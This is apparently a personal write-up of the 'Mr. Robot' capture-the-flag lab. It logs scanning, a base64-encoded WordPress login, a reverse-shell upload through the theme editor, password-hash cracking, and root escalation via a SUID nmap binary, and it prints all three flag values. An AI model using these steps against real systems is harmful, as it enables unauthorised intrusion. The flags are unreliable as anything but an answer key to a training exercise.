# Mr. Robot CTF

> Mihai Stanciu | 2 January 2021

```
export ip=10.10.47.32
```

## Nmap scan in `nmap/initial` - no ports open

## Finding [whoismrrobot](whoismrrobot.com) 

1. Found website at `10.10.47.32` - command line
2. Ran command `prepare` - it leads to `whoismrrobot.com`
3. On `Origin` machine found multiple files
* `home` asking for _email_
* `pattern` returns an _image_
* `C64E` return a _commodore 64 console_

## Gobuster scan (results in `gobuster/initial`)

* Yielded `/robots.txt` 
```
User-agent: *
fsocity.dic
key-1-of-3.txt
```

## Found key 1 in `/key-1-of-3.txt`

```
073403c8a58a1f80d943455fb30724b9
```

## Found `ZWxsaW90OkVSMjgtMDY1Mgo=` on `/license` - hidden

* Decrypted with base64 -- `elliot:ER28-0652`

* Found `Editor` tab in WordPress

* Uploaded a reverse shell to it

* Found password file in `/home/robot` - `robot:c3fcd3d76192e4007dfb496cca67e13b`

* Decrypted it to `robot:abcdefghijklmnopqrstuvwxyz`

## With the reverse shell I am user `daemon` with low privelages

* I have the user `robot`'s password

* Used command `su - robot` and typed in the password

* Now I can access `/home/robot/key-2-of-3.txt`

```
822c73956184f694993bede3eb39f959
```

## Found `nmap` SUID through `find / -user root -per /4000 2>/dev/null`

* Found vulnerability with [GTFOBins](https://gtfobins.github.io/#)
```
nmap --interactive
nmap> !sh
```

**Note:** I am now _root_ so I have access to `/root/key-3-of-3.txt`

```
04787ddef27c3dee1ee161b21670b4e4
```